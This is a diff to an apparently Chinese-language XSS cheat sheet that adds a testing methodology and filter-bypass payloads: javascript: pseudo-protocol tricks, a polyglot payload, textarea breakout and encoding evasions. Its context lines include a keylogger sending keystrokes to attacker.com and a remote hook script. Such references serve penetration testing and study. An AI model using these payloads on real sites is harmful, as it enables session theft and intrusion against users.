@@ -125,3 +125,82 @@ new Image().src="http://attacker.com/log?k="+e.key;
 ```html
 <script src="http://attacker.com:3000/hook.js"></script>
 ```
+
+---
+
+## 12. XSS测试方法论
+
+```
+1. 确定输入输出点: URL参数、表单、HTTP头(Referer/UA/Cookie)、隐藏参数
+2. 观察过滤规则: 尖括号、引号、关键字(script/on事件)、空格
+3. 绕过策略:
+   - 闭合标签: "><payload>
+   - 事件触发: onmouseover, onclick
+   - 编码绕过: URL编码(%0A换行)、HTML实体、十六进制
+   - 特殊字符: 换行符%0A代替空格, 双写关键字
+   - 协议利用: javascript:伪协议
+```
+
+---
+
+## 13. javascript:伪协议绕过
+
+```html
+<!-- 基础用法 -->
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)">
+```
+
+### 过滤绕过
+
+| 过滤规则 | 绕过方法 | 原理 |
+|----------|----------|------|
+| 简单匹配 `javascript:` | 大小写: `JavaScript:alert(1)` | 浏览器不区分大小写 |
+| 简单匹配 | 插入Tab: `java%09script:alert(1)` | 浏览器正常解析 |
+| 过滤 `script` | HTML实体编码: `java&#115;cript:alert(1)` | HTML上下文会解码 |
+| 黑名单过滤 | 其他伪协议: `data:text/html,<script>alert(1)</script>` | - |
+
+---
+
+## 14. 常见绕过模式
+
+```
+<>被转义时: 利用标签原有属性 onmouseover等
+换行符绕过: %0A 可以闭合标签
+
+隐藏参数发现: URL中添加 &key=value 测试隐藏字段
+  → 发现 t_sort 参数可通过GET传入
+  → 在value中构造 Onclick, 修改type='text'使隐藏失效
+  → 或使用 onfocus + autofocus 自动触发
+```
+
+---
+
+## 15. Polyglot 通用Payload
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+---
+
+## 16. textarea闭合绕过
+
+```html
+</textarea><script>alert(1)</script>
+```
+
+---
+
+## 17. 编码绕过补充
+
+```html
+<!-- 十六进制编码 -->
+<img src=x onerror=alert&#x28;1&#x29;>
+
+<!-- Unicode编码 (仅在JS上下文) -->
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+
+<!-- Tab字符绕过 -->
+<img%09src=x%09onerror=alert(1)>
+```
